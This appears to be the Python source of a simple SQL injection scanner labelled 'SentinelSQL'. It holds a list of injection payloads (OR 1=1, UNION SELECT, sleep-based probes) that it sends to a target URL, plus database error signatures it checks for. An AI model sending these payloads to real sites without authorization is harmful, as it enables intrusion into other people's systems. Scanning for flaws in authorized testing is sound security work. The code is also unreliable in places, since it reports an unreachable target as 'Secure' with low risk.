import requests
from urllib.parse import urlparse, parse_qs

SQL_PAYLOADS = [
    "'", "''", '"', "'--", "'#", "'/*", "' OR '1'='1", "' OR '1'='2", "' OR 1=1", "' OR 1=2",
    '" OR "1"="1', "' AND 1=1", "' AND 1=2", "' OR 'a'='a", "' OR 'a'='b", "' OR 1=1--",
    "' OR 1=1#", "' OR 1=1/*", "' OR 1=1 LIMIT 1", "' UNION SELECT NULL", "' UNION SELECT 1",
    "' UNION SELECT 1,2", "' UNION SELECT 1,2,3", "' UNION SELECT NULL,NULL",
    "' UNION SELECT NULL,NULL,NULL", "admin' --", "admin' #", "' OR sleep(5)--",
    "' OR benchmark(1000000,md5(1))", "' OR 1=1 AND 'a'='a"
]

SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "syntax error", "ORA-01756", "unclosed quotation mark",
    "SQLSTATE", "Microsoft OLE DB", "PostgreSQL", "Warning: mysql", "mysqli_fetch"
]

def extract_params(url):
    parsed = urlparse(url)
    return parse_qs(parsed.query)

def inject_payload(url, payload):
    if "=" not in url:
        return None
    base, value = url.split("=", 1)
    return f"{base}={value}{payload}"

def check_sql_error(response_text):
    for error in SQL_ERRORS:
        if error.lower() in response_text.lower():
            return True
    return False

def check_response_length(original, test):
    diff = abs(len(original) - len(test))
    if diff > 50:
        return True
    return False

def run_sqli_scan(url):
    findings = []
    logs = []

    logs.append("[INFO] Initializing SentinelSQL AI engine...")
    logs.append(f"[INFO] Targeting: {url}")

    try:
        logs.append("[INFO] Fetching original baseline response...")
        original = requests.get(url, timeout=10).text
    except Exception as e:
        logs.append(f"[ERROR] Target unreachable: {str(e)}")
        return {
            "status": "Secure",
            "risk_level": "Low",
            "findings": findings,
            "details": logs
        }

    for payload in SQL_PAYLOADS:
        injected_url = inject_payload(url, payload)
        if not injected_url:
            continue
            
        logs.append(f"[SCANNING] Testing payload: {payload}")
        logs.append(f"[URL] {injected_url}")

        try:
            r = requests.get(injected_url, timeout=10)
            error_detected = check_sql_error(r.text)
            length_changed = check_response_length(original, r.text)

            if error_detected or length_changed:
                findings.append({
                    "payload": payload,
                    "url": injected_url
                })
                logs.append(f"[WARNING] Potential vulnerability detected with payload: {payload}")
                # We can stop early if we find one, or continue. For a thorough scan, we continue.
                # But for MVP, finding one is enough. Let's break to speed it up.
                break
        except:
            continue

    if findings:
        logs.append("[SUCCESS] Analysis complete. Vulnerabilities found!")
        return {
            "status": "Vulnerable",
            "risk_level": "Critical",
            "findings": findings,
            "details": logs
        }
    else:
        logs.append("[SUCCESS] Analysis complete. Target appears secure.")
        return {
            "status": "Secure",
            "risk_level": "Low",
            "findings": [],
            "details": logs
        }
